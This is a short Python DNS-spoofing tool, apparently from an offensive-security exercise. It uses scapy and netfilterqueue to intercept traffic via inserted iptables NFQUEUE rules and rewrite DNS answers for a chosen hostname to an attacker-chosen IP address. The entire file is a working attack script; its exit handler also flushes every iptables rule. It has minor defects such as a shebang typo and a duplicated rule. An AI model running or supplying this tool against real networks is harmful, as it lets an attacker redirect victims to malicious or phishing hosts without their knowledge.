#!/usr/bin/ebv python
import netfilterqueue
import subprocess
import optparse
import scapy.all as scapy

def delete_integrity(scapy_packet):
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.UDP].len
    del scapy_packet[scapy.UDP].chksum
    return scapy_packet

def modify_answer(scapy_packet, answer):
    scapy_packet[scapy.DNS].an = answer
    scapy_packet[scapy.DNS].ancount = 1
    return scapy_packet

def dns_spoof_response(packet, scapy_packet, qname, new_ip):
    answer = scapy.DNSRR(rrname=qname, rdata=new_ip)
    scapy_packet = modify_answer(scapy_packet, answer)
    scapy_packet = delete_integrity(scapy_packet)
    packet.set_payload(str(scapy_packet))
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname= scapy_packet[scapy.DNSQR].qname
        if options.origin_host in qname:
            print("[+] spoofing target ---> "+qname +" to "+options.dest_host)
            packet = dns_spoof_response(packet, scapy_packet, qname, options.dest_host)
    packet.accept()

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-o", "--host_org", dest="origin_host", help="Dns host request traffic to match")
    parser.add_option("-d", "--host_dst", dest="dest_host", help="DNS destination host")
    (options,arguments)=parser.parse_args()
    if not options.origin_host :
        parser.error("[-] Please specify an origin host to search on forwarding traffic  ")
    if not options.dest_host:
        parser.error("[-] Please specify a destination host for traffic attack ")
    return options


########
#Main spoof attack
######
options = get_arguments()
print("init attack ....DNS ")
print("Enable Iptables queue for input target packets ... on queue number 0")
subprocess.check_output(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
subprocess.check_output(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "1"])
subprocess.check_output(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "1"])
queue = netfilterqueue.NetfilterQueue()
queue.bind(int(1), process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    print("[*] CRTL +C Detecting ... Flush queue for Iptables on local machine ")
    subprocess.check_output(["iptables", "--flush"])
    print("[*] End program ")